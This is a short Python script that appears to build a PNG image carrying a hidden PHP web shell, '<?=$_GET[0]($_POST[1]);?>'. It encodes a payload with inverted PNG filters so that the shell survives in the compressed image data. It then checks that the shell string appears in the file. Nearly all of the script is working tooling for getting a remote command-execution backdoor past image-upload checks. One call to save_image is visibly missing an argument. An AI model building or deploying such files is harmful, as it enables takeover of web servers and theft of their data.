from binascii import hexlify as hex, unhexlify as unhex
from math import floor
from PIL import Image


def filter_one(payload):
    blist = [c for c in payload]
    for i in range(len(blist) - 3):
        blist[i + 3] = (blist[i + 3] + blist[i]) % 256
    return blist

def filter_three(payload):
    blist = [c for c in payload]
    for i in range(len(blist) - 3):
        blist[i + 3] = (blist[i + 3] + floor(blist[i] / 2)) % 256
    return blist

def bypass_filters(gzdeflate_payload):
    payload = []
    plist = unhex(gzdeflate_payload)
    payload.extend(filter_one(plist))
    payload.extend(filter_three(plist))
    return payload

def save_image(payload, output_image, output_size):
    im = Image.new("RGB", output_size)
    x = 0
    i = 0
    while (i < len(payload) - 3):
        r = payload[i]
        g = payload[i + 1]
        b = payload[i + 2]
        im.putpixel((x, 0), (r, g, b))
        i += 3
        x += 1
    im.save(output_image, optimize=False, compress_level=6)

def verify(filename, clear_payload):
    #"""
    # I would like to verify if the PNG is valid and not corrupt but Pillow .verify() is not yet implemented
    im = Image.open(filename)
    im.verify()
    im.close()
    #"""
    content = open(filename, "rb").read()
    assert(clear_payload in content)

if __name__ == "__main__":
    payload = b"a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310"
    filename = "test.png"
    filterproof = bypass_filters(payload)
    # the following assert assure that filter1 and filter3 perform the correct transformation to the payload
    assert(hex(bytes(filterproof)) == b"a39f67f70e931b23be2c8ad080f9e1ae22f6d9435dfbaecc5a01dca39f67a5be5f76745a4ca13f7abf306b882d60657d529dad88a166")
    save_image(filterproof, filename)
    verify(filename, b"<?=$_GET[0]($_POST[1]);?>")
